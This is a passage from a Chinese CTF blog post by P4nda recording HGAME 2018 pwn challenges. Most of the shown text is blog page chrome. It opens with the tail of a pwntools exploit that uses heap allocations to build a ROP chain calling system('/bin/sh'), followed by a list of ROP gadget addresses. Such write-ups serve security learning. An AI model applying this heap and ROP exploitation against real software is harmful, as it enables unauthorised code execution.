class="line">add(<span class="string">'padding\n'</span>,<span class="number">0</span>,<span class="number">0x38</span>,<span class="string">'hack by p4nda'</span>)</span><br><span class="line">delete_user(<span class="string">'padding'</span>)</span><br><span class="line">add(<span class="string">'step4\n'</span>,<span class="number">0</span>,<span class="number">0x50</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(stack_addr-stack_offset<span class="number">-0x8</span>))</span><br><span class="line">add(<span class="string">'step4\n'</span>,<span class="number">0</span>,<span class="number">0x40</span>,p64(<span class="number">0x0000000000401053</span>)+p64(next(libc.search(<span class="string">'/bin/sh'</span>)))+p64(libc.symbols[<span class="string">'system'</span>]))</span><br><span class="line"><span class="comment">#add('step3\n',18,0x60,'a'*0x40)</span></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">============================================================</span></span><br><span class="line"><span class="string">0x000000000040104c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040104e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401050 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000401052 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040104b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040104f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400870 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x0000000000401053 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x0000000000401051 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040104d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400709 : ret</span></span><br><span class="line"><span class="string">0x0000000000400782 : ret 0x2018</span></span><br><span class="line"><span class="string">0x0000000000400abd : ret 0x8b48</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
<p><a href="/img/hgame2018/hgame.zip">题目</a></p>

      
    </div>
    
  </div>
  
    
    <div class="copyright">
        <p><span>本文标题:</span><a href="/2018/03/06/hgame/">HGAME 2018 PWN题记录</a></p>
        <p><span>文章作者:</span><a href="/" title="回到主页">P4nda</a></p>
        <p><span>发布时间:</span>2018-03-06, 00:00:00</p>
        <p><span>最后更新:</span>2018-07-05, 21:30:12</p>
        <p>
            <span>原始链接:</span><a class="post-url" href="/2018/03/06/hgame/" title="HGAME 2018 PWN题记录">http://p4nda.top/2018/03/06/hgame/</a>
            <span class="copy-path" data-clipboard-text="原文: http://p4nda.top/2018/03/06/hgame/　　作者: P4nda" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
            <script> var clipboard = new Clipboard('.copy-path'); </script>
        </p>
        <p>
            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
        </p>
    </div>



    <nav id="article-nav">
        
            <div id="article-nav-newer" class="article-nav-title">
                <a href="/2018/03/15/n1ctf2018/">
                    N1CTF 2018 &amp;&amp; 线程堆知识源代码分析
                </a>
            </div>
        
        
            <div id="article-nav-older" class="article-nav-title">
                <a href="/2018/03/03/question/">
                    问题解决及工具使用
                </a>
            </div>
        
    </nav>

  
</article>

    <div id="toc" class="toc-article">
        <strong class="toc-title">文章目录</strong>
        
            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#LEVEL-WEEK-1"><span class="toc-number">1.</span> <span class="toc-text">LEVEL - WEEK 1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#guess-number"><span class="toc-number">1.1.</span> <span class="toc-text">guess_number</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag-server"><span class="toc-number">1.2.</span> <span class="toc-text">flag_server</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zazahui"><span class="toc-number">1.3.</span> <span class="toc-text">zazahui</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LEVEL-WEEK-2"><span class="toc-number">2.</span> <span class="toc-text">LEVEL - WEEK 2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-shellcode"><span class="toc-number">2.1.</span> <span class="toc-text">ez_shellcode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-bash-jail"><span class="toc-number">2.2.</span> <span class="toc-text">ez_bash_jail</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hacker-system-v1"><span class="toc-number">2.3.</span> <span class="toc-text">hacker_system_v1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-shellcode-ver2"><span class="toc-number">2.4.</span> <span class="toc-text">ez_shellcode_ver2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LEVEL-WEEK-3"><span class="toc-number">3.</span> <span class="toc-text">LEVEL - WEEK 3</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#hacker-system-ver2"><span class="toc-number">3.1.</span> <span class="toc-text">hacker_system_ver2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#calc"><span class="toc-number">3.2.</span> <span class="toc-text">calc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#zazahui-ver2"><span class="toc-number">3.3.</span> <span class="toc-text">zazahui_ver2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#message-saver"><span class="toc-number">3.4.</span> <span class="toc-text">message_saver</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LEVEL-WEEK-4"><span class="toc-number">4.</span> <span class="toc-text">LEVEL - WEEK 4</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ascii-art-market"><span class="toc-number">4.1.</span> <span class="toc-text">ascii_art_market</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#base64-decoder"><span class="toc-number">4.2.</span> <span class="toc-text">base64_decoder</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hacker-system-ver3"><span class="toc-number">4.3.</span> <span class="toc-text">hacker_system_ver3</span></a></li></ol></li></ol>
        
    </div>
    <style>
        .left-col .switch-btn,
        .left-col .switch-area {
            display: none;
        }
        .toc-level-3 i,
        .toc-level-3 ol {
            display: none !important;
        }
    </style>

    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">

    <script>
        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
    </script>



    
<div class="share">
    
        <div class="bdsharebuttonbox">
            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
        </div>
        <script>
            window._bd_share_config={
                "common":{"bdSnsKey":{},"bdText":"HGAME 2018 PWN题记录　| p4nda's blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
        </script>
    

    
</div>







    
        <section id="comments">
    <style> aside.comment-bar { margin: auto 30px; }</style>
    <div id="disqus_thread"></div>
    <script>
        var disqus_config = function(){
            this.page.url = 'http://p4nda.top/2018/03/06/hgame/';
            this.page.identifier = '2018/03/06/hgame/';
        };
        var loadComment = function(){
            var d = document, s = d.createElement('script');
            s.src = '//p4nda.disqus.com/embed.js';
            s.setAttribute('data-timestamp', +new Date());
            (d.head || d.body).appendChild(s);
        }
    </script>
    
    <script> loadComment(); </script>

</section>


    




    <div class="scroll" id="post-nav-button">
        
            <a href="/2018/03/15/n1ctf2018/" title="上一篇: N1CTF 2018 &amp;&amp; 线程堆知识源代码分析">
                <i class="fa fa-angle-left"></i>
            </a>
        

        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>

        
            <a href="/2018/03/03/question/" title="下一篇: 问题解决及工具使用">
                <i class="fa fa-angle-right"></i>
            </a>
        
    </div>

    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/07/27/QWB/">QWB CTF 2019 growupjs解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/06/11/CVE-2018-17463/">Google V8引擎的CVE-2018-17463漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/01/starctf-2019-hackme/">【KERNEL PWN】STARCTF 2019 hackme 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/02/16/CVE-2017-7184/">Linux xfrm模块越界读写提权漏洞分析（CVE-2017-7184）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/18/CVE-2017-16995/">Linux ebpf模块整数扩展问题导致提权漏洞分析（CVE-2017-16995）</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/01/02/kernel-bpf-overflow/">Linux kernel 4.20 BPF 整数溢出漏洞分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/12/06/xnuca-final-paraweb/">X-NUCA'2018 Final paraweb解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/27/wctf-2018-klist/">【KERNEL PWN】WCTF 2018 klist解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/26/XNUCA-secretcenter/">X-NUCA'2018 secretcenter 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/11/07/stringipc/">【KERNEL PWN】从内存任意读写到权限提升</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/14/hwb-ctf-2018/">护网杯 CTF 2018线上预选赛PWN题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/10/11/ciscn-2017-babydriver/">【KERNEL PWN】CISCN 2017 babydriver题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/08/27/WDBCTF-2018/">网鼎杯CTF部分PWN题复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/27/CISCN-Final/">CISCN 2018 Final赛记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/20/0ctf-baby/">【KERNEL PWN】0ctf 2018 final baby题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/13/ciscn2018-core/">【KERNEL PWN】强网杯CTF2018 core题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/11/WCTF-2018/">【WCTF 2018】parrot_revenge 题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/07/02/patch-in-pwn/">CTF线下赛中常用的PWN题patch方法</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/28/pwnable-tw-wannaheap/">【PWNABLE.TW】 wannaheap 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/06/25/pwnhub_Panda's_gift/">胖哈勃Panda's gift 及 TSCTF 2018 FINAL出题笔记</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/29/suctf2018/">SUCTF 2018部分PWN题复现</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/05/13/ciscn-ctf-2018/">全国大学生信息安全竞赛（CISCN）解题赛部分PWN题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/18/house-of-rabbit/">House Of Rabbit 原理</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/17/hitb2018/">HITB gsec CTF Qual 2018 部分PWN题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/04/kernel-pwn-start/">CTF KETNEL PWN 入门记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/04/04/0ctf2018/">0ctf 2018 PWN 部分题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/27/QWB2018/">QWBCTF 2018 PWN 部分题解</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/20/tcache/">tcache 源码分析及利用思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/15/n1ctf2018/">N1CTF 2018 && 线程堆知识源代码分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/06/hgame/">HGAME 2018 PWN题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/03/03/question/">问题解决及工具使用</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/02/05/hitctf/">HITCTF 2018 PWN 题记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/15/pwnable-tw-bookwriter/">【PWNABLE.TW】 BookWriter 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/12/06/pwnable-tw-alivenote/">【PWNABLE.TW】 alive_note 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/10/13/pwnable-tw-starbound/">【PWNABLE.TW】 starbound 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/29/pwnable-tw-deathnote/">【PWNABLE.TW】 deathnote 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/20/pwnable-tw-seethefile/">【PWNABLE.TW】 seethefile 解题思路</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/09/14/pwnable-tw-applestore/">【PWNABLE.TW】 applestore 解题思路</a></li></ul>




    <script>
        
    </script>
</div>
      <footer id="footer">
    <div class="outer">
        <div id="footer-info">
            <div class="footer-left">
                <i class="fa fa-copyright"></i> 
                2017-2019 P4nda
            </div>
            <div class="footer-right">
                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
	 <div id="landlord">
		  <div class="message" style="opacity:0"></div>
		  <canvas id="live2d" width="280" height="250" class="live2d"></canvas>
		  <div class="hide-button">隐藏</div>
	  </div>
			</div>

        </div>
		<!-- 血小板 -->

<script type="text/javascript" src="https://cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript">
    var message_Path = '/live2d/'
    var home_Path = 'https://haremu.com/'
</script>
<script type="text/javascript" src="/live2d/js/live2d.js"></script>
<script type="text/javascript" src="/live2d/js/message.js"></script>
<script type="text/javascript">
    loadlive2d("live2d", "/live2d/model/xiaoban/model.json");
</script>  
        
            <div class="visit">
                
                    <span id="busuanzi_container_site_pv" style='display:none'>
                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
                        </span>
                    </span>
                
                
                    <span>| </span>
                
                
                    <span id="busuanzi_container_page_pv" style='display:none'>
                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
                        </span>
                    </span>
                
            </div>
        		
    </div>
	
</footer>
    </div>
    
    <script src="/js/GithubRepoWidget.js"></script>

<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>





<div class="scroll" id="scroll">
    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
             github: ".github-widget a", 
            
            
            
            
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>

    <script>
        var originTitle = document.title;
        var titleTime;
        document.addEventListener("visibilitychange", function() {
            if (document.hidden) {
                document.title = "(つェ⊂) 天黑了~ " + originTitle;
                clearTimeout(titleTime);
            }
            else {
                document.title = "(*´∇｀*) 天亮了~ " + originTitle;
                titleTime = setTimeout(function() {
                    document.title = originTitle;
                }, 2000);
            }
        })
    </script>

<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
</script>
  </div>
</body>
</html>